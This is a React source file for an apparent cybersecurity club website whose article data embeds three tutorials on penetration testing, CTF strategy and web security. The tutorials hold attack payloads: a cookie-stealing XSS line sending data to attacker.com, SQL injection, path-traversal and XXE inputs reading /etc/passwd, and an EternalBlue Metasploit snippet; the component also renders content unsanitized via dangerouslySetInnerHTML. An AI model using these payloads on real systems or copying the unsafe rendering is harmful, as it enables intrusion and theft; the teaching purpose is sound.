import React, { useState, useEffect, useMemo } from 'react';
import { useParams, useNavigate, Link } from 'react-router-dom';
import NotFound from './NotFound';
import './App.css';

function ArticleView() {
  const { articleId } = useParams();
  const navigate = useNavigate();
  const [article, setArticle] = useState(null);
  const [loading, setLoading] = useState(true);
  const [bookmarked, setBookmarked] = useState(false);
  const [relatedArticles, setRelatedArticles] = useState([]);

  // Extended articles data with full content
  const articlesDatabase = useMemo(() => ({
    1: {
      id: 1,
      title: "Advanced Penetration Testing Techniques",
      excerpt: "Explore advanced penetration testing methodologies used in real-world scenarios. This comprehensive guide covers network enumeration, vulnerability assessment, and exploitation techniques that every cybersecurity professional should know.",
      content: `
# Advanced Penetration Testing Techniques

## Introduction

Penetration testing, often called "pen testing," is a critical component of cybersecurity that involves simulating real-world attacks to identify vulnerabilities before malicious actors can exploit them. This comprehensive guide will walk you through advanced methodologies used by professional penetration testers.

## Network Enumeration

### Port Scanning Techniques

The first phase of any penetration test involves reconnaissance and enumeration. Advanced port scanning goes beyond basic Nmap scans:

\`\`\`bash
# Advanced TCP SYN scan with timing and detection evasion
nmap -sS -T2 -f --data-length 25 -D RND:10 target.com

# UDP scan for critical services
nmap -sU --top-ports 1000 target.com

# Version detection with script scanning
nmap -sV -sC --version-intensity 9 target.com
\`\`\`

### Service Enumeration

Once ports are identified, service enumeration becomes crucial:

- **HTTP/HTTPS Services**: Use tools like Nikto, dirb, and gobuster
- **SMB Services**: Leverage smbclient and enum4linux
- **SNMP**: Utilize snmpwalk and onesixtyone
- **DNS**: Employ dnsrecon and fierce for subdomain enumeration

## Vulnerability Assessment

### Automated Scanning

While manual testing is essential, automated tools provide comprehensive coverage:

1. **Nessus**: Commercial vulnerability scanner with extensive plugin database
2. **OpenVAS**: Open-source alternative with regular updates
3. **Nuclei**: Fast, template-based vulnerability scanner

### Manual Testing Approaches

Advanced penetration testers combine automated results with manual verification:

- **Web Application Testing**: OWASP Top 10 vulnerabilities
- **Network Services**: Buffer overflows, authentication bypasses
- **Wireless Security**: WPA/WPA2 cracking, rogue access points

## Exploitation Techniques

### Metasploit Framework

The Metasploit Framework remains the gold standard for exploitation:

\`\`\`ruby
# Example exploit module usage
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
set LHOST attacker.com
exploit
\`\`\`

### Custom Exploit Development

Advanced testers often develop custom exploits:

- **Buffer Overflow Exploitation**: Stack and heap-based attacks
- **Return-Oriented Programming (ROP)**: Bypassing modern protections
- **Format String Vulnerabilities**: Information disclosure and code execution

## Post-Exploitation

### Privilege Escalation

Once initial access is gained, privilege escalation becomes the next objective:

- **Windows**: Token impersonation, UAC bypass, kernel exploits
- **Linux**: SUID binaries, cron jobs, kernel vulnerabilities
- **Active Directory**: Kerberoasting, Golden/Silver tickets

### Persistence Mechanisms

Maintaining access while avoiding detection:

- **Registry modifications** (Windows)
- **Cron jobs and systemd services** (Linux)
- **WMI event subscriptions**
- **DLL hijacking**

## Advanced Evasion Techniques

### Anti-Virus Evasion

Modern penetration testing requires sophisticated evasion:

- **Payload encoding**: Using tools like msfvenom with custom encoders
- **Process hollowing**: Injecting code into legitimate processes
- **Living off the land**: Using built-in system tools

### Network Detection Evasion

Avoiding network-based detection systems:

- **Traffic fragmentation**: Breaking packets to avoid signatures
- **Protocol tunneling**: HTTP/DNS tunneling for C2 communication
- **Timing attacks**: Slow, distributed scanning to avoid rate limiting

## Reporting and Documentation

### Executive Summary

Every penetration test report should include:

- **Risk assessment matrix**
- **Business impact analysis**
- **Remediation timeline recommendations**

### Technical Details

Detailed technical sections should cover:

- **Vulnerability descriptions with CVSS scores**
- **Proof-of-concept demonstrations**
- **Step-by-step reproduction guides**
- **Remediation recommendations with verification steps**

## Conclusion

Advanced penetration testing requires a combination of technical expertise, creativity, and systematic methodology. Continuous learning and staying updated with the latest attack vectors and defensive measures is essential for success in this field.

Remember that penetration testing should only be performed on systems you own or have explicit written permission to test. Unauthorized testing is illegal and unethical.

## References

- OWASP Testing Guide
- NIST Cybersecurity Framework
- SANS Penetration Testing Resources
- CVE Database for latest vulnerabilities
      `,
      tags: ["penetration-testing", "cybersecurity", "advanced", "networking"],
      isPinned: true,
      author: "SCDT Team",
      authorBio: "The SCDT Team consists of experienced cybersecurity professionals and students passionate about information security.",
      readTime: "15 min read",
      publishDate: "2024-01-15",
      views: 1247,
      category: "Technical Guides"
    },
    2: {
      id: 2,
      title: "CTF Competition Strategies",
      excerpt: "Learn winning strategies for Capture The Flag competitions. From reconnaissance to privilege escalation, discover the methodologies that have helped our team succeed in major cybersecurity competitions.",
      content: `
# CTF Competition Strategies: A Comprehensive Guide

## Introduction to CTF Competitions

Capture The Flag (CTF) competitions are cybersecurity contests where participants solve challenges to find hidden "flags" - typically strings of text that prove successful completion of a task. These competitions are excellent for developing practical cybersecurity skills and testing knowledge in a competitive environment.

## Types of CTF Competitions

### Jeopardy-Style CTFs

The most common format, featuring categories such as:

- **Cryptography**: Breaking ciphers, analyzing encryption
- **Web Exploitation**: Finding vulnerabilities in web applications
- **Binary Exploitation**: Reverse engineering and exploiting binaries
- **Forensics**: Analyzing digital evidence and artifacts
- **Steganography**: Finding hidden information in files
- **OSINT**: Open Source Intelligence gathering

### Attack-Defense CTFs

Teams defend their own systems while attacking others:

- **Infrastructure Management**: Maintaining service availability
- **Patch Management**: Fixing vulnerabilities quickly
- **Monitoring**: Detecting incoming attacks
- **Offensive Operations**: Exploiting other teams' systems

## Pre-Competition Preparation

### Team Formation and Roles

Successful CTF teams typically include specialists in:

- **Web Security Expert**: Handles web application challenges
- **Binary Analyst**: Focuses on reverse engineering and exploitation
- **Cryptographer**: Tackles encryption and mathematical challenges
- **Forensics Specialist**: Analyzes digital artifacts
- **Network Security Expert**: Handles network-based challenges

### Tool Setup and Environment

Essential tools for CTF competitions:

\`\`\`bash
# Basic toolkit installation
sudo apt update && sudo apt install -y \\
    nmap nikto dirb gobuster \\
    john hashcat hydra \\
    wireshark tcpdump \\
    python3-pip git curl wget \\
    binutils gdb radare2 ghidra \\
    steghide exiftool binwalk

# Python libraries
pip3 install pwntools requests beautifulsoup4 \\
            cryptography pycryptodome scapy
\`\`\`

## Challenge-Specific Strategies

### Web Exploitation

Common web vulnerabilities in CTFs:

1. **SQL Injection**
   \`\`\`sql
   # Union-based injection
   ' UNION SELECT 1,2,3,database()--
   
   # Boolean-based blind injection
   ' AND (SELECT SUBSTRING(version(),1,1))='5'--
   \`\`\`

2. **Cross-Site Scripting (XSS)**
   \`\`\`javascript
   // Basic XSS payload
   <script>alert('XSS')</script>
   
   // Advanced XSS for cookie stealing
   <script>document.location='http://attacker.com/'+document.cookie</script>
   \`\`\`

3. **Local File Inclusion (LFI)**
   \`\`\`
   # Common LFI payloads
   ../../../etc/passwd
   ....//....//....//etc/passwd
   %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
   \`\`\`

### Cryptography Challenges

Approach cryptographic challenges systematically:

1. **Identify the cipher type**
2. **Look for patterns or known plaintext**
3. **Consider frequency analysis for substitution ciphers**
4. **Check for weak implementations of strong algorithms**

Common cryptographic challenges:

- **Caesar Cipher**: Simple rotation cipher
- **Vigenère Cipher**: Polyalphabetic substitution
- **RSA**: Look for small exponents or weak key generation
- **AES**: Check for ECB mode patterns or weak keys

### Binary Exploitation

Binary exploitation requires understanding:

1. **Assembly Language**: x86/x64 instruction sets
2. **Memory Layout**: Stack, heap, and memory protections
3. **Common Vulnerabilities**: Buffer overflows, format strings
4. **Exploitation Techniques**: ROP, GOT overwrite, heap exploitation

Example buffer overflow exploit:

\`\`\`python
from pwn import *

# Connect to the target
p = remote('target.com', 1337)

# Craft the payload
padding = b'A' * 64  # Overflow the buffer
ret_addr = p64(0xdeadbeef)  # Overwrite return address
payload = padding + ret_addr

# Send the exploit
p.sendline(payload)
p.interactive()
\`\`\`

## Time Management Strategies

### Point Allocation

Effective point management during competitions:

- **Start with easier challenges** to build momentum
- **Identify high-value targets** early in the competition
- **Don't get stuck** on single challenges for too long
- **Collaborate effectively** with team members

### Documentation

Maintain detailed notes during the competition:

- **Flag submissions**: Track which flags have been found
- **Challenge progress**: Document partial solutions
- **Tool outputs**: Save important command results
- **Team communication**: Coordinate efforts effectively

## Advanced Competition Techniques

### Automation and Scripting

Develop scripts for common tasks:

\`\`\`python
#!/usr/bin/env python3
import requests
import re

# Automated flag extraction script
def extract_flags(url):
    response = requests.get(url)
    flags = re.findall(r'flag{[^}]+}', response.text)
    return flags

# Usage
flags = extract_flags('http://target.com/page')
for flag in flags:
    print(f"Found flag: {flag}")
\`\`\`

### Collaborative Problem Solving

Effective team strategies:

- **Parallel processing**: Work on multiple challenges simultaneously
- **Knowledge sharing**: Share findings and techniques immediately
- **Peer review**: Have teammates verify solutions
- **Resource allocation**: Assign team members based on expertise

## Post-Competition Analysis

### Learning from Mistakes

After each competition:

- **Review unsolved challenges**: Understand where you got stuck
- **Study writeups**: Learn from other teams' solutions
- **Practice weak areas**: Focus on categories where you struggled
- **Update toolkits**: Add new tools discovered during the competition

### Building for Future Success

Continuous improvement strategies:

- **Regular practice**: Participate in online CTF platforms
- **Team building**: Recruit members with complementary skills
- **Tool development**: Create custom tools for recurring challenge types
- **Knowledge base**: Maintain a repository of useful techniques and payloads

## Conclusion

Success in CTF competitions requires a combination of technical knowledge, strategic thinking, and effective teamwork. Regular practice, continuous learning, and maintaining a well-organized toolkit are essential for competitive success.

Remember that CTFs are learning opportunities first and competitions second. Focus on understanding the underlying concepts and techniques, and the competitive success will follow naturally.

## Recommended Resources

- **Practice Platforms**: HackTheBox, TryHackMe, PicoCTF
- **CTF Databases**: CTFtime, CTF101
- **Learning Resources**: LiveOverflow YouTube channel, SANS courses
- **Community**: Join CTF Discord servers and local security groups
      `,
      tags: ["ctf", "competition", "strategy", "cybersecurity"],
      isPinned: true,
      author: "Competition Team",
      authorBio: "Our competition team has participated in over 50 CTF events and achieved top 10 finishes in major international competitions.",
      readTime: "12 min read",
      publishDate: "2024-01-10",
      views: 892,
      category: "Competition Guides"
    },
    3: {
      id: 3,
      title: "Web Application Security Fundamentals",
      excerpt: "Understanding web application vulnerabilities is crucial for any cybersecurity professional. This article covers OWASP Top 10, secure coding practices, and common attack vectors in modern web applications.",
      content: `
# Web Application Security Fundamentals

## Introduction

Web application security is a critical aspect of cybersecurity, as web applications are often the primary attack vector for cybercriminals. This comprehensive guide covers the fundamental concepts, common vulnerabilities, and best practices for securing web applications.

## The OWASP Top 10

The Open Web Application Security Project (OWASP) maintains a list of the most critical web application security risks. Understanding these vulnerabilities is essential for any security professional.

### 1. Injection Flaws

Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query.

**SQL Injection Example:**
\`\`\`sql
-- Vulnerable query
SELECT * FROM users WHERE username = '$username' AND password = '$password'

-- Malicious input: admin' --
-- Resulting query: SELECT * FROM users WHERE username = 'admin' --' AND password = ''
\`\`\`

**Prevention:**
- Use parameterized queries/prepared statements
- Validate and sanitize all input
- Use stored procedures with proper input validation
- Implement least privilege database access

### 2. Broken Authentication

Authentication and session management vulnerabilities allow attackers to compromise passwords, keys, or session tokens.

**Common Issues:**
- Weak password policies
- Session fixation attacks
- Insecure session management
- Credential stuffing attacks

**Prevention:**
- Implement strong password policies
- Use multi-factor authentication (MFA)
- Secure session management
- Account lockout mechanisms
- Regular security audits

### 3. Sensitive Data Exposure

Applications frequently do not adequately protect sensitive data such as financial information, healthcare records, and personal information.

**Protection Strategies:**
- Encrypt data at rest and in transit
- Use strong encryption algorithms (AES-256, RSA-2048+)
- Implement proper key management
- Minimize data collection and retention
- Use HTTPS everywhere

### 4. XML External Entities (XXE)

XXE attacks occur when XML input containing a reference to an external entity is processed by a weakly configured XML parser.

**Example Vulnerable Code:**
\`\`\`xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
\`\`\`

**Prevention:**
- Disable XML external entity processing
- Use less complex data formats (JSON)
- Validate and sanitize XML input
- Use XML parsers with secure defaults

## Secure Development Practices

### Input Validation

All input should be validated on both client and server sides:

\`\`\`javascript
// Client-side validation (not sufficient alone)
function validateEmail(email) {
    const re = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
    return re.test(email);
}

// Server-side validation (essential)
function sanitizeInput(input) {
    return input.replace(/[<>\"'&]/g, function(match) {
        return {
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;',
            '&': '&amp;'
        }[match];
    });
}
\`\`\`

### Output Encoding

Properly encode output to prevent XSS attacks:

\`\`\`python
import html

# HTML encoding
def html_encode(text):
    return html.escape(text)

# URL encoding
import urllib.parse

def url_encode(text):
    return urllib.parse.quote(text)
\`\`\`

### Authentication and Authorization

Implement robust authentication and authorization mechanisms:

\`\`\`python
# Example using Flask and bcrypt
from flask_bcrypt import Bcrypt
from functools import wraps
import jwt

bcrypt = Bcrypt()

# Password hashing
def hash_password(password):
    return bcrypt.generate_password_hash(password).decode('utf-8')

# Password verification
def verify_password(password, hashed):
    return bcrypt.check_password_hash(hashed, password)

# JWT token generation
def generate_token(user_id):
    payload = {
        'user_id': user_id,
        'exp': datetime.utcnow() + timedelta(hours=24)
    }
    return jwt.encode(payload, SECRET_KEY, algorithm='HS256')
\`\`\`

## Common Attack Vectors

### Cross-Site Scripting (XSS)

XSS attacks inject malicious scripts into web pages viewed by other users.

**Types of XSS:**
1. **Stored XSS**: Malicious script stored on the server
2. **Reflected XSS**: Script reflected off the web server
3. **DOM XSS**: Client-side script modifies the DOM

**Prevention:**
- Content Security Policy (CSP)
- Input validation and output encoding
- Use frameworks with built-in XSS protection
- Regular security testing

### Cross-Site Request Forgery (CSRF)

CSRF attacks trick users into performing unwanted actions on web applications where they're authenticated.

**Prevention:**
\`\`\`html
<!-- CSRF token in forms -->
<form method="POST" action="/transfer">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <input type="text" name="amount" required>
    <button type="submit">Transfer</button>
</form>
\`\`\`

### Server-Side Request Forgery (SSRF)

SSRF attacks cause the server to make requests to unintended locations.

**Prevention:**
- Whitelist allowed destinations
- Validate and sanitize URLs
- Use network segmentation
- Implement proper firewall rules

## Security Testing

### Static Application Security Testing (SAST)

Analyze source code for security vulnerabilities:

\`\`\`bash
# Example using Bandit for Python
pip install bandit
bandit -r /path/to/your/code

# Example using ESLint security plugin for JavaScript
npm install eslint-plugin-security
eslint --ext .js,.jsx src/
\`\`\`

### Dynamic Application Security Testing (DAST)

Test running applications for vulnerabilities:

\`\`\`bash
# Example using OWASP ZAP
zap-baseline.py -t http://your-app.com

# Example using Nikto
nikto -h http://your-app.com
\`\`\`

### Interactive Application Security Testing (IAST)

Combines SAST and DAST approaches for comprehensive testing.

## Security Headers

Implement security headers to protect against common attacks:

\`\`\`javascript
// Express.js example
const helmet = require('helmet');

app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            scriptSrc: ["'self'"],
            imgSrc: ["'self'", "data:", "https:"],
        },
    },
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    }
}));
\`\`\`

## Conclusion

Web application security is an ongoing process that requires continuous attention and improvement. By understanding common vulnerabilities, implementing secure development practices, and conducting regular security testing, organizations can significantly reduce their risk exposure.

Stay updated with the latest security threats and best practices through resources like OWASP, security conferences, and vulnerability databases. Remember that security is not a one-time implementation but a continuous process of improvement and adaptation.

## Additional Resources

- OWASP Web Security Testing Guide
- SANS Web Application Security Courses
- Burp Suite Academy
- PortSwigger Web Security Research
- Mozilla Web Security Guidelines
      `,
      tags: ["web-security", "owasp", "fundamentals", "development"],
      isPinned: false,
      author: "Security Research",
      authorBio: "Our security research team focuses on identifying and analyzing emerging threats in web application security.",
      readTime: "18 min read",
      publishDate: "2024-01-08",
      views: 1534,
      category: "Security Fundamentals"
    },
    // Add more articles as needed...
  }), []);

  useEffect(() => {
    // Simulate loading delay
    const timer = setTimeout(() => {
      const foundArticle = articlesDatabase[parseInt(articleId)];
      if (foundArticle) {
        setArticle(foundArticle);
        // Increment view count (in a real app, this would be an API call)
        foundArticle.views += 1;
        
        // Find related articles based on tags
        const related = Object.values(articlesDatabase)
          .filter(a => a.id !== foundArticle.id)
          .filter(a => a.tags.some(tag => foundArticle.tags.includes(tag)))
          .slice(0, 3);
        setRelatedArticles(related);
        
        // Check if bookmarked
        const bookmarks = JSON.parse(localStorage.getItem('bookmarkedArticles') || '[]');
        setBookmarked(bookmarks.includes(foundArticle.id));
      }
      setLoading(false);
    }, 500);

    return () => clearTimeout(timer);
  }, [articleId, articlesDatabase]);

  const handleBookmark = () => {
    const bookmarks = JSON.parse(localStorage.getItem('bookmarkedArticles') || '[]');
    let newBookmarks;
    
    if (bookmarked) {
      newBookmarks = bookmarks.filter(id => id !== article.id);
    } else {
      newBookmarks = [...bookmarks, article.id];
    }
    
    localStorage.setItem('bookmarkedArticles', JSON.stringify(newBookmarks));
    setBookmarked(!bookmarked);
  };

  const handleTagClick = (tag) => {
    navigate(`/resources/club?tag=${encodeURIComponent(tag)}`);
  };

  if (loading) {
    return (
      <div className="article-loading">
        <div className="loading-spinner"></div>
        <p>Loading article...</p>
      </div>
    );
  }

  if (!article) {
    return <NotFound />;
  }

  return (
    <div className="article-view-page">
      <div className="article-header">
        <nav className="article-nav">
          <Link to="/resources/club" className="back-link">
            ← Back to Articles
          </Link>
          <button 
            className={`bookmark-btn ${bookmarked ? 'bookmarked' : ''}`}
            onClick={handleBookmark}
            title={bookmarked ? 'Remove bookmark' : 'Bookmark article'}
          >
            {bookmarked ? '🔖' : '📖'} {bookmarked ? 'Bookmarked' : 'Bookmark'}
          </button>
        </nav>
        
        <div className="article-meta-header">
          <div className="article-category">{article.category}</div>
          <h1 className="article-full-title">{article.title}</h1>
          
          <div className="article-author-section">
            <div className="author-info">
              <strong>{article.author}</strong>
              {article.authorBio && <p className="author-bio">{article.authorBio}</p>}
            </div>
            <div className="article-stats">
              <span className="publish-date">📅 {article.publishDate}</span>
              <span className="read-time">⏱️ {article.readTime}</span>
              <span className="view-count">👁️ {article.views} views</span>
            </div>
          </div>
          
          <div className="article-tags-header">
            {article.tags.map(tag => (
              <button
                key={tag}
                className="tag clickable"
                onClick={() => handleTagClick(tag)}
              >
                {tag}
              </button>
            ))}
          </div>
        </div>
      </div>

      <div className="article-content-container">
        <article className="article-full-content">
          <div 
            className="markdown-content"
            dangerouslySetInnerHTML={{ 
              __html: article.content.replace(/\n/g, '<br/>').replace(/```(.*?)```/gs, '<pre><code>$1</code></pre>') 
            }}
          />
        </article>

        <aside className="article-sidebar">
          {relatedArticles.length > 0 && (
            <div className="sidebar-section">
              <h3>🔗 Related Articles</h3>
              <div className="related-articles">
                {relatedArticles.map(related => (
                  <Link 
                    key={related.id} 
                    to={`/resources/club/${related.id}`}
                    className="related-article"
                  >
                    <h4>{related.title}</h4>
                    <p>{related.excerpt.substring(0, 100)}...</p>
                    <div className="related-meta">
                      {related.author} · {related.readTime}
                    </div>
                  </Link>
                ))}
              </div>
            </div>
          )}

          <div className="sidebar-section">
            <h3>🏷️ Article Tags</h3>
            <div className="article-tags-sidebar">
              {article.tags.map(tag => (
                <button
                  key={tag}
                  className="topic-tag small"
                  onClick={() => handleTagClick(tag)}
                >
                  {tag}
                </button>
              ))}
            </div>
          </div>
        </aside>
      </div>
    </div>
  );
}

export default ArticleView;
